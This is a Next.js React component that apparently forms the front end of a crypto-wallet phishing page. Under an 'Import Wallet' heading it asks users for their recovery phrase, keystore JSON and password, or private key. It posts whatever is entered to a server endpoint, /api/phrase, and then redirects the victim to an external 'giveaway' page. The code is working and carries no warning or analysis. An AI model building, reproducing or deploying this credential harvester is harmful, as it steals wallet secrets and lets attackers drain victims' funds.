"use client";

import { useState, FormEvent } from "react";
import ImportIcon from "@/assets/import-icon.svg";
import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useParams } from 'next/navigation';

interface FormData {
  phrase?: string;
  password?: string;
  privateKey?: string;
  wallet?: string;
}

export default function GeneralConnect() {
  const router = useRouter();
  const params = useParams();

  const [tabState, setTabState] = useState<string>("phrase");
  const [formData, setFormData] = useState<FormData>({
    wallet: params.wallet as string | undefined,
  });
  const [isLoading, setIsLoading] = useState(false);
  // console.log("wallet: ", router.query.wallet);

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const response = await fetch("/api/phrase", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        throw new Error("Network response was not ok");
      }

      router.replace("https://www.chaingpt.org/giveaway");
      // Handle successful import (e.g., show a success message, redirect, etc.)
    } catch (error) {
      console.error("Error importing wallet:", error);
      // Handle error (e.g., show an error message to the user)
    } finally {
      setIsLoading(false);
      // Reset form fields
      setFormData({});
      // Reset form elements
      (e.target as HTMLFormElement).reset();
    }
  };

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    setFormData({ ...formData, [e.target.name]: e.target.value, wallet: formData.wallet });
  };

  return (
    <div className="p-5 w-full">
      <Link href={"/connect-wallet"} className="flex items-center gap-2 mb-6">
        <Image src={ImportIcon} alt="import-icon" width={30} height={30} />
        <h4 className="text-white text-2xl font-semibold">Import Wallet</h4>
      </Link>

      <div className="flex border-b-[1px] border-solid border-white">
        <button
          className="text-white font-semibold px-4 py-3 border-b-[2px] border-solid border-transparent hover:border-white transition-all duration-500 ease-in-out"
          onClick={() => setTabState("phrase")}
          disabled={isLoading}
        >
          Phrase
        </button>
        <button
          className="text-white font-semibold px-4 py-3 border-b-[2px] border-solid border-transparent hover:border-white transition-all duration-500 ease-in-out"
          onClick={() => setTabState("keystore")}
          disabled={isLoading}
        >
          Keystore JSON
        </button>
        <button
          className="text-white font-semibold px-4 py-3 border-b-[2px] border-solid border-transparent hover:border-white transition-all duration-500 ease-in-out"
          onClick={() => setTabState("privateKey")}
          disabled={isLoading}
        >
          Private Key
        </button>
      </div>

      {tabState === "phrase" && (
        <form onSubmit={handleSubmit} className="mt-8">
          <textarea
            name="phrase"
            id="phrase"
            placeholder="Enter your phrase"
            cols={30}
            rows={5}
            required
            className="w-full rounded-md p-3 text-black"
            onChange={handleInputChange}
            disabled={isLoading}
            value={formData.phrase || ""}
          ></textarea>

          <h4 className="text-slate-300 text-sm mt-4">
            Typically 12 (sometimes 24) words separated by single spaces.
          </h4>
          <button
            type="submit"
            className="w-full h-[42px] text-white font-semibold bg-[#2020c9] hover:bg-[#205bc9] hover:shadow-sm mt-5 rounded-md flex items-center justify-center"
            disabled={isLoading}
          >
            {isLoading ? <Spinner /> : "IMPORT"}
          </button>
        </form>
      )}
      {tabState === "keystore" && (
        <form onSubmit={handleSubmit} className="mt-8">
          <textarea
            name="phrase"
            id="phrase"
            placeholder="Enter your Keystore JSON"
            cols={30}
            rows={5}
            required
            className="w-full rounded-md p-3 text-black"
            onChange={handleInputChange}
            disabled={isLoading}
            value={formData.phrase || ""}
          ></textarea>

          <input
            type="password"
            name="password"
            placeholder="Password"
            required
            className="w-full rounded-md p-3 mt-4 text-black"
            onChange={handleInputChange}
            disabled={isLoading}
            value={formData.password || ""}
          />

          <h4 className="text-slate-300 text-sm mt-4">
            Several lines of text plus the password you used to encrypt it.
          </h4>
          <button
            type="submit"
            className="w-full h-[42px] text-white font-semibold bg-[#2020c9] hover:bg-[#205bc9] hover:shadow-sm mt-5 rounded-md flex items-center justify-center"
            disabled={isLoading}
          >
            {isLoading ? <Spinner /> : "IMPORT"}
          </button>
        </form>
      )}
      {tabState === "privateKey" && (
        <form onSubmit={handleSubmit} className="mt-8">
          <input
            type="text"
            name="privateKey"
            placeholder="Private Key"
            className="w-full rounded-md p-3 mt-4 text-black"
            required
            onChange={handleInputChange}
            disabled={isLoading}
            value={formData.privateKey || ""}
          />
          <h4 className="text-slate-300 text-sm mt-4">
            Typically 64 alphanumeric characters.
          </h4>

          <button
            type="submit"
            className="w-full h-[42px] text-white font-semibold bg-[#2020c9] hover:bg-[#205bc9] hover:shadow-sm mt-5 rounded-md flex items-center justify-center"
            disabled={isLoading}
          >
            {isLoading ? <Spinner /> : "IMPORT"}
          </button>
        </form>
      )}
    </div>
  );
}

// Spinner component using Tailwind CSS
function Spinner() {
  return (
    <div
      className="inline-block h-6 w-6 animate-spin rounded-full border-4 border-solid border-current border-r-transparent align-[-0.125em] motion-reduce:animate-[spin_1.5s_linear_infinite]"
      role="status"
    ></div>
  );
}
